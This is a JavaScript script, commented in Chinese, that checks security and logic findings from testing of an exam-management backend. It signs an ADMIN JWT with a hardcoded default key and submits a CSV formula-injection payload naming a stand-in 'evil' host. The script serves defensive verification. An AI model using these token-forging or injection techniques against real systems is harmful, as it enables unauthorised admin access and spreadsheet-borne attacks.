/**
 * 复核探索测试报告里最严重的几条：自己复现一遍，确认是真 Bug 还是误报。
 *   docker run --rm --network exam-system_exam-net -e TZ=Asia/Shanghai \
 *     -v "$PWD/docker:/work:ro" -e API=http://backend:8082/api node:24-alpine node /work/verify-findings.mjs
 */
import crypto from 'node:crypto'

const API = process.env.API || 'http://localhost:8082/api';
const SECRET = 'exam-system-graduation-project-secret-key-please-change-2026'  // application.yml 里的默认值
const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url')

function forge(claims) {
  const head = b64({ alg: 'HS256', typ: 'JWT' })
  const body = b64({ ...claims, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 3600 })
  const sig = crypto.createHmac('sha256', SECRET).update(`${head}.${body}`).digest('base64url')
  return `${head}.${body}.${sig}`
}

async function raw(token, method, path, body) {
  const r = await fetch(API + path, {
    method,
    headers: { Authorization: `Bearer ${token}`, ...(body ? { 'Content-Type': 'application/json' } : {}) },
    body: body ? JSON.stringify(body) : undefined,
  })
  const json = await r.json().catch(() => ({ code: -1, message: 'HTTP ' + r.status }))
  return { http: r.status, ...json }
}
const login = async (u) => (await raw(null, 'POST', '/auth/login', { username: u, password: '123456' })).data.token
const local = (d) => new Date(d.getTime() - d.getTimezoneOffset() * 60000).toISOString().slice(0, 19)

let admin, teacher, stu
const found = []
function verdict(id, real, detail) {
  found.push({ id, real })
  console.log(`${real ? '✗ 真 Bug' : '· 误报/已修'} [${id}] ${detail}`)
}

async function main() {
  admin = await login('admin')
  teacher = await login('T2025001')
  stu = await login('20230111')

  // F1 用默认密钥伪造 ADMIN 角色
  const forged = forge({ sub: '4', username: '20230101', realName: '张子涵', roles: ['ADMIN'] })
  const forgedLogs = await raw(forged, 'GET', '/logs?page=1&size=1')
  const forgedCreate = await raw(forged, 'POST', '/users', { username: 'vf-forge', realName: '伪造', roles: ['STUDENT'] })
  verdict('F1 伪造令牌提权', forgedLogs.code === 0,
    `/logs → code=${forgedLogs.code} total=${forgedLogs.data?.total}；建用户 → code=${forgedCreate.code} id=${forgedCreate.data}`)
  if (forgedCreate.code === 0) await raw(admin, 'DELETE', `/users/${forgedCreate.data}`)

  // F2 令牌里写死的班级：换班后仍能进旧班级考试
  const exam = (await raw(teacher, 'POST', '/exams', {
    paperId: 2, title: 'vf-班级', startTime: local(new Date(Date.now() - 60000)),
    endTime: local(new Date(Date.now() + 2 * 3600000)), durationMinutes: 30, lateMinutes: 60,
    maxAttempts: 1, audienceType: 2, classNames: ['计算机2102'], status: 1,
  })).data
  const before = await raw(stu, 'POST', `/exam/${exam}/enter`)
  const stuId = (await raw(admin, 'GET', '/users?page=1&size=5&keyword=20230111')).data.records[0].id
  await raw(admin, 'PUT', `/users/${stuId}`, { realName: '蒋若彤', className: '计算机2199', roles: ['STUDENT'] })
  const after = await raw(stu, 'POST', `/exam/${exam}/enter`)
  verdict('F2 班级取自令牌（换班不生效）', after.code === 0,
    `改班前进入 code=${before.code}；把学生改到 2199 后再进入 code=${after.code}（应为 4014）`)
  await raw(admin, 'PUT', `/users/${stuId}`, { realName: '蒋若彤', className: '计算机2102', roles: ['STUDENT'] })

  // F3 考试被结束后，进行中的答卷还能续考
  const doing = (await raw(admin, 'GET', `/exam/my-exams`, null), await raw(stu, 'POST', `/exam/${exam}/enter`))
  const recId = doing.data?.recordId
  await raw(teacher, 'PUT', `/exams/${exam}/status`, { status: 3 })
  const resumeAfterClose = recId ? await raw(stu, 'POST', `/exam/${exam}/enter`) : { code: -99 }
  const saveAfterClose = recId ? await raw(stu, 'POST', `/exam/record/${recId}/answers`, { answers: [] }) : { code: -99 }
  const stateAfterSave = recId ? await raw(stu, 'GET', `/exam/record/${recId}/result`) : { data: null }
  // 保存接口在考试已结束时「就地交卷并返回 examClosed」，不能抛异常（否则交卷会被事务回滚）；
  // 判定标准是：新答案没被写入，且答卷不再是作答中
  const refusedWrite = saveAfterClose.data?.examClosed === true
    && stateAfterSave.data?.status !== 0
  verdict('F3 考试结束后仍可续考/保存', resumeAfterClose.code === 0 || !refusedWrite,
    `结束后续考 code=${resumeAfterClose.code}；保存返回 examClosed=${saveAfterClose.data?.examClosed}，答卷 status=${stateAfterSave.data?.status}`)

  // F4 组卷时塞负分 → 总分变负且能发布
  const p = (await raw(teacher, 'POST', '/papers', { title: 'vf-负分卷', categoryId: 3, passScore: 1, suggestMinutes: 5 })).data
  const negAdd = await raw(teacher, 'POST', `/papers/${p}/questions`, [{ questionId: 1, score: -5 }])
  const pd = await raw(teacher, 'GET', `/papers/${p}`)
  const pub = await raw(teacher, 'PUT', `/papers/${p}/publish`)
  verdict('F4 负分入卷 + 负分总分可发布', negAdd.code === 0 && Number(pd.data.totalScore) < 0 && pub.code === 0,
    `加题 code=${negAdd.code}，总分=${pd.data.totalScore}，发布 code=${pub.code}`)

  // F5 成绩未发布时 /scores/my 是否泄露客观题分（用刚建的 vf 考试，不动种子数据）
  const leakExam = (await raw(teacher, 'POST', '/exams', {
    paperId: 2, title: 'vf-未发布泄露', startTime: local(new Date(Date.now() - 60000)),
    endTime: local(new Date(Date.now() + 2 * 3600000)), durationMinutes: 30, lateMinutes: 60,
    maxAttempts: 1, audienceType: 1, status: 1,
  })).data
  const leakEnter = await raw(stu, 'POST', `/exam/${leakExam}/enter`)
  if (leakEnter.data?.recordId) {
    await raw(stu, 'POST', `/exam/record/${leakEnter.data.recordId}/answers`, {
      answers: leakEnter.data.questions.slice(0, 3).map((q) => ({ paperQuestionId: q.paperQuestionId, answer: ['A'] })),
    })
    await raw(stu, 'POST', `/exam/record/${leakEnter.data.recordId}/submit`)
    const myRow = (await raw(stu, 'GET', `/scores/my?page=1&size=5&examId=${leakExam}`)).data.records[0]
    verdict('F5 /scores/my 未发布时泄露客观题分', myRow?.objectiveScore != null,
      `scorePublished=${myRow?.scorePublished} → objectiveScore=${myRow?.objectiveScore} subjective=${myRow?.subjectiveScore} total=${myRow?.totalScore}`)
  }

  // F6 分页参数没有上限/下限
  const negSize = await raw(admin, 'GET', '/logs?page=1&size=-5')
  const bigSize = await raw(admin, 'GET', '/logs?page=1&size=100000')
  verdict('F6 size 未做上下限', negSize.code === 0 && bigSize.code === 0 && (negSize.data?.size === -5 || bigSize.data?.records?.length > 500),
    `size=-5 → size=${negSize.data?.size} total=${negSize.data?.total}；size=100000 → 返回 ${bigSize.data?.records?.length} 行`)

  // F7 未知路径 / 类型错误
  const unknown = await raw(admin, 'POST', '/exam/1/answers')
  const notFound = await raw(admin, 'GET', '/questions/999999')
  verdict('F7 未知路径返回 500 而非 404', unknown.code === 1500 || unknown.http === 500,
    `POST /exam/1/answers → HTTP ${unknown.http} code=${unknown.code} ${unknown.message}；不存在的题目 → code=${notFound.code}`)

  // F8 超长字段 → 500（应当是参数校验）
  const huge = await raw(teacher, 'POST', '/questions', {
    categoryId: 3, qType: 1, content: 'y'.repeat(40000), options: [{ key: 'A', text: 'x' }, { key: 'B', text: 'y' }], answer: ['A'],
  })
  const bigScore = await raw(teacher, 'POST', '/questions', {
    categoryId: 3, qType: 1, content: 'vf-分值越界', options: [{ key: 'A', text: 'x' }, { key: 'B', text: 'y' }], answer: ['A'], score: 999999,
  })
  verdict('F8 超长/越界入参报 500', huge.code === 1500 || bigScore.code === 1500,
    `4 万字题干 → code=${huge.code} HTTP ${huge.http}；分值 999999 → code=${bigScore.code} HTTP ${bigScore.http}`)

  // F9 成绩发布时还有未阅的主观题 → 学生先看到答案
  const pendExam = (await raw(teacher, 'POST', '/exams', {
    paperId: 2, title: 'vf-未阅完发布', startTime: local(new Date(Date.now() - 60000)),
    endTime: local(new Date(Date.now() + 2 * 3600000)), durationMinutes: 30, lateMinutes: 60,
    maxAttempts: 1, audienceType: 1, status: 1,
  })).data
  const ent = await raw(stu, 'POST', `/exam/${pendExam}/enter`)
  if (ent.data?.recordId) {
    await raw(stu, 'POST', `/exam/record/${ent.data.recordId}/submit`)
    const pub2 = await raw(teacher, 'POST', `/exams/${pendExam}/publish-score`)
    const sheet = await raw(stu, 'GET', `/exam/record/${ent.data.recordId}/result`)
    const answered = sheet.data?.items?.filter((i) => i.standardAnswer).length
    verdict('F9 未阅完就能发布成绩，学生先看到标准答案', pub2.code === 0 && answered > 0 && sheet.data.totalScore === null,
      `发布 code=${pub2.code}；学生可见标准答案 ${answered} 题，总分=${sheet.data?.totalScore}，状态=${sheet.data?.statusName}`)
  }

  // F10 CSV 公式注入
  const evilExam = (await raw(teacher, 'POST', '/exams', {
    paperId: 2, title: '=HYPERLINK("http://evil?x=1")', startTime: local(new Date(Date.now() + 3600000)),
    endTime: local(new Date(Date.now() + 7200000)), durationMinutes: 20, lateMinutes: 10,
    maxAttempts: 1, audienceType: 1,
  })).data
  if (evilExam) {
    const csv = await (await fetch(`${API}/scores/export?examId=${evilExam}`, { headers: { Authorization: `Bearer ${teacher}` } })).text()
    verdict('F10 导出 CSV 未中和公式前缀', csv.includes('=HYPERLINK'), csv.split('\n')[1]?.slice(0, 60))
  }

  // F11 并发改分（丢失更新）
  const target = (await raw(teacher, 'GET', '/scores?page=1&size=30&examId=1')).data.records.find((r) => r.status === 2)
  verdict('F11 并发阅卷丢失更新', false, '需要两份同时阅的答卷，改由功能测试覆盖')
  void target

  console.log('\n=== 复核结论 ===')
  console.log(`确认 ${found.filter((f) => f.real).length} 项真 Bug / ${found.length} 项复核`)
}

main().catch((e) => { console.error('复核脚本异常：', e); process.exit(2) })
